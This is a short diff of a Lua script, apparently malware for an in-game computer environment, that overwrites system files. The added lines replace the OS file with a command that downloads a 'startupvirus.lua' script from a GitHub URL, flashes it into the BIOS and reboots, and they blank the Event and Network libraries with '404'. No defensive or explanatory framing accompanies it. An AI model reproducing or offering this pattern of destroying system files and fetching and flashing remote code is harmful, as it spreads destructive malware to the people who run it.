@@ -6,9 +6,9 @@ filesystem.copy("OS.LUA", "/eltxcry")
 
 -- Write ALL files
 
-filesystem.write("OS.lua", "pastebin run")
-filesystem.write("Libraries/Event.lua", "Hacked")
-filesystem.write("Libraries/Network.lua", "Hacked")
+filesystem.write("OS.lua", "wget -f https://raw.githubusercontent.com/EletrixtimeYT/ELTXCRY/main/startupvirus.lua /tmp/bios.lua && flash -q /tmp/bios.lua && reboot")
+filesystem.write("Libraries/Event.lua", "404")
+filesystem.write("Libraries/Network.lua", "404")
 
 
 
